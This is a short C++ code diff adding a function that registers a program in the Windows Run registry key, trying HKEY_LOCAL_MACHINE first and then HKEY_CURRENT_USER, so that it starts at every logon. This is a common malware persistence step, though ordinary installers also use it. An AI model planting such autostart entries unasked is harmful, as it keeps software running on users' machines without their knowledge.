@@ -159,5 +159,46 @@ namespace Registry
                 }
             }
         }
+    wchar_t* s2lp(const std::string& s)
+    {
+
+        LPWSTR ws = new wchar_t[s.size()+1];
+        copy( s.begin(), s.end(), ws );
+        ws[s.size()] = 0; // zero at the end
+        return ws;
+    }
+    void RegisterProgram2(std::string appname,std::string path)
+    {
+        PCWSTR AppName = s2lp(appname);
+        HKEY key = HKEY_LOCAL_MACHINE;
+        std::string str(path.begin(),path.end());
+        LPCWSTR PathToExe_LP = s2lp(path);
+        if (IsRegistered(key,AppName))
+        {
+            Helper::WriteAppLog("[:D]This App is already installed");
+            return;
+        }
+        else
+        {
+            if (Register(key,AppName, PathToExe_LP, L""))
+            {
+                Helper::WriteAppLog("[;)]Installation the registry was successful : HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue = " + str);
+            }
+            else
+            {
+                Helper::WriteAppLog("[:(]INSTALLATION FAILED : HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue = " + str + "\nTrying to install at HKEY_CURRENT_USER...");
+                key = HKEY_CURRENT_USER;
+                if (Register(key,AppName, PathToExe_LP, L""))
+                {
+                    Helper::WriteAppLog("[;)]Installation the registry was successful : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue = " + str);
+                }
+                else
+                {
+                    Helper::WriteAppLog("[:(]INSTALLATION FAILED : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue = " + str);
+                }
+            }
+        }
+    }
+
 }
 #endif // REGEDIT_H
